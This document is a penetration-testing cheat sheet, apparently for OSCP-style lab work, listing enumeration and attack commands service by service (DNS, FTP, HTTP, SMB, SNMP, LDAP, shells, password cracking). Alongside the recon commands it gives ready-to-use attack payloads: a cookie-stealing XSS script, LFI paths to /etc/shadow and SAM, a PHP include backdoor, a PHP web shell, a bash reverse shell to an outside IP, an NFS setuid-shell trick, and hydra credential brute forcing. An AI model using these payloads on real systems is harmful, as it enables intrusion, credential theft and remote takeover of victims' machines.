## DNS

Find DNS server:

> $ nslookup thinc.local 10.11.1.221  
> $ dig @10.11.1.221 thinc.local

Forward Lookup Brute Force:

> $ dnsrecon -d [example.com](http://example.com) -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml

Reverse Lookup Brute Force:

> $ dnsrecon -d [demo.com](http://demo.com) -t rvl

DNS Zone Transfers:

> $ host -l domain &gt; $ip $ dnsrecon -d [megacorpone.com](http://megacorpone.com) -t axfr  
> $ dnsenum [zonetransfer.me](http://zonetransfer.me)

## FTP

Vulnerability Scanning

> $ nmap -p 21 --script="+\*ftp\* and not brute and not dos and not fuzzer" -vv -oN ftp &gt; $ip

Deafult Creds

> $ hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f &gt; $ip ftp

## FTP MANUAL SCANS

Anonymous login

Enumerate the hell out of the machine!

> $ OS version  
> $ Other software you can find on the machine \(Prog Files, yum.log, /bin\)  
> $ password files  
> $ DLLs for msfpescan / BOF targets

Do you have UPLOAD potential?

> $ Can you trigger execution of uploads?  
> $ Swap binaries?

Public exploits for ftp server software

## HTTP\(S\)

Vulnerability Scanning

> $ nmap -p 80,443 --script="+\*http\* and not brute and not dos and not fuzzer" -vv -oN http\(s\) &gt; $ip $ Nikto -port 80,443 -host &gt; $ip -o -v nikto.txt or $ nikto -Option USERAGENT=Mozilla -url=[http://10.11.1.24](http://10.11.1.24) -o nikto.txt

Directories

> $ gobuster dir -u [https://10.11.1.35](https://10.11.1.35) -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster

Word Press

> $ wpscan --url [http://10.11.1.251/wp](http://10.11.1.251/wp)

## MANUAL HTTP SCANS

Check the source code

Technologies used

> $whatweb &gt; $ip:80 --color=never --log-brief="whattheweb.txt"

curl -s \[http:// &gt; $ip/robots.txt\]\(http:// &gt; $ip/robots.txt\)

Burp

> $ get params  
> $ post params  
> $ cookies  
> $ user agents  
> $ referrers  
> $ all the headers  
> $ change get requests to posts  
> $ take note of all error codes  
> $ fuzz parameter values, and names, etc.

Things to be on look for:

> $ Default credentials for software  
> $ SQL-injectable GET/POST params  
> $ XSS  
> Test  
> $ &lt;script&gt; alert\("Hello! I am an alert box!!"\);&lt;/script&gt;  
> $ &lt;iframe SRC="http:10.11.0.106/xss\_test.html" height = "0" width ="0"&gt;&lt;/iframe&gt;  
> Exploit  
> $ &lt;script&gt;new Image\(\).src="[http://10.11.0.106/bogus.php?output=](http://10.11.0.106/bogus.php?output=)"+document.cookie;&lt;/script&gt;  
> $ LFI/RFI through ?page=foo type params  
> LFI:  
> $ /etc/passwd \| /etc/shadow insta-win  
> $ /var/www/html/config.php or similar paths to get SQL etc creds  
> $ ?page=php://filter/convert.base64-encode/resource=../config.php  
> $ ../../../../../boot.ini to find out windows version  
> RFI:  
> $ Have your PHP/cgi downloader ready  
> $ &lt;?php include \_GET\\['inc'\\]; ?&gt; simplest backdoor to keep it dynamic without anything messing your output &gt; $ Then you can just [http://IP/inc.php?inc=http://](http://IP/inc.php?inc=http://) &gt; $YOURIP/bg.php and have full control with minimal footprint on target machine $ get phpinfo\(\)

HTTPS

> $ Heartbleed / CRIME / Other similar attacks  
> $ Read the actual SSL CERT to:  
> $ find out potential correct vhost to GET  
> $ is the clock skewed  
> $ any names that could be usernames for bruteforce/guessing

LFI Linux Files:

> $ /etc/issue  
> $ /proc/version  
> $ /etc/profile  
> $ /etc/passwd  
> $ /etc/shadow  
> $ /root/.bash\_history  
> $ /var/mail/root  
> $ /var/spool/cron/crontabs/root  
> $ /etc/sysconfig/iptables  
> $ /etc/sysconfig/ip6tables

LFI Windows Files:

> $ %SYSTEMROOT%\repair\system  
> $ %SYSTEMROOT%\repair\SAM  
> $ %SYSTEMROOT%\repair\SAM  
> $ %WINDIR%\win.ini  
> $ %SYSTEMDRIVE%\boot.ini  
> $ %WINDIR%\Panther\sysprep.inf  
> $ %WINDIR%\system32\config\AppEvent.Evt  
> $ c:\windows\system32\drivers\etc\hosts

## MYSQL

Vulnerability Scanning

> $ nmap -p 3306 --script="+\*mysql\* and not brute and not dos and not fuzzer" -vv -oN mysql &gt; $ip

Deafult Creds

> $ hydra -s 3306 -C /usr/share/sparta/wordlists/mysql-default-userpass.txt -u -f &gt; $ip ftp

Public Exploit

## RPC

Find NFS Port

> $ nmap -p 111 --script=rpcinfo.nse -vv -oN nfs\_port &gt; $ip

Services Running

> $ rpcinfo –p &gt; $ip $ rpcbind -p rpcinfo –p x.x.x.x


## NFS

Show Mountable NFS Shares

> $ nmap --script=nfs-showmount -oN mountable\_shares &gt; $ip $ showmount -e &gt; $ip

List NFS exported shares. If 'rw,no\_root\_squash' is present, upload and execute sid-shell

> $ chown root:root sid-shell; chmod +s sid-shell

## POP3

Enumerating user accounts

> $ nc -nv &gt; $ip 25 $ VRFY user  
> $ USER user  
> $ EXPN user

## SMB&NETBIOS

Over All scan

> $ enum4linux -a &gt; $ip

Guest User and null authentication

> $ smbmap -u anonymous -p anonymous -H 10.10.10.172  
> $ smbmap -u '' -p '' -H 10.10.10.172

Vulnerability Scanning

> $ nmap --script="+\*smb\* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln &gt; $ip

Enumerate Hostnames

> $ nmblookup -A &gt; $ip

List Shares with no creds and guest account

> $ smbmap -H \[ip/hostname\] -u anonymous -p hokusbokus -R  
> $ nmap --script smb-enum-shares -p 139,445 &gt; $ip

List Shares with creds

> $ smbmap -H \[ip\] -d \[domain\] -u \[user\] -p \[password\] -r --depth 5 -R

Connect to share

> $ smbclient \\\\[ip\]\\\[share name\]

Netbios Information Scanning

> $ nbtscan -r &gt; $ip/24

Nmap find exposed Netbios servers

> $ nmap -sU --script nbstat.nse -p 137 &gt; $ip

Mount smb share:

> $ mount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=”guest”,password=””

## SNMP

Enumeration Tools

> $ Onesixtyone – c &lt;community list file&gt; -I &lt;ip-address&gt;  
> $ Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &gt; $ip 1.3.6.1.2.1.25.4.2.1.2 $ snmp-check &gt; $ip

Default Community Names:

> $ public, private, cisco, manager

Enumerate MIB:

> $ 1.3.6.1.2.1.25.1.6.0 System Processes  
> $ 1.3.6.1.2.1.25.4.2.1.2 Running Programs  
> $ 1.3.6.1.2.1.25.4.2.1.4 Processes Path  
> $ 1.3.6.1.2.1.25.2.3.1.4 Storage Units  
> $ 1.3.6.1.2.1.25.6.3.1.2 Software Name  
> $ 1.3.6.1.4.1.77.1.2.25 User Accounts  
> $ 1.3.6.1.2.1.6.13.1.3 TCP Local Ports

SNMP V3

> $ nmap -p 161 --script=snmp-info &gt; $ip $ default creds:  
> ▪ /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt

## DOMAIN

Leak DC hostname:

> $ noslookup  
> server 10.10.10.172  
> set type=ns  
> 10.10.10.172  
> 127.0.0.1

Nmap:

> $ nmap -p 53 --script=\*dns\* -vv -oN dns &gt; $ip

## LDAP/Active Directory

--Look for anonymous bind

> $ ldapsearch -x -b "dc=megabank,dc=local" "\*" -h &gt; $ip

## SHELLS

Spawning a TTY Shell - Break out of Jail or limited shell You should almost always upgrade your shell after taking control of an apache or www user \(For example when you encounter an error message when trying to run an exploit sh: no job control in this shell \)

Interactive shell:

> $python -c 'import pty; pty.spawn\("/bin/bash"\)' $ echo os.system\('/bin/bash'\)

Adjust Interactive shell:

> $ Ctrl-Z  
> $ echo &gt; $TERM //find term $ stty raw -echo //disable shell echo  
> $ fg  
> $ reset  
> $ export SHELL=bash  
> $ export TERM=xterm

Php backdoor:

> $ &lt;?php echo shell\_exec\( &gt; $\_GET\['cmd'\]\);?&gt;

Php shell:

> &lt;?php echo shell\_exec\('bash -i &gt;& /dev/tcp/10.11.0.106/443 0&gt;&1'\);?&gt;  
> 

## PSSWD CRACKING

```text
> $ Look for the hash in online databases
```

Hashcat:

> $ Find mode in hashcat  
> ▪ hashcat --example hashes  
> $ hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt

John:

> $ john files --wordlist=/usr/share/wordlists/rockyou.txt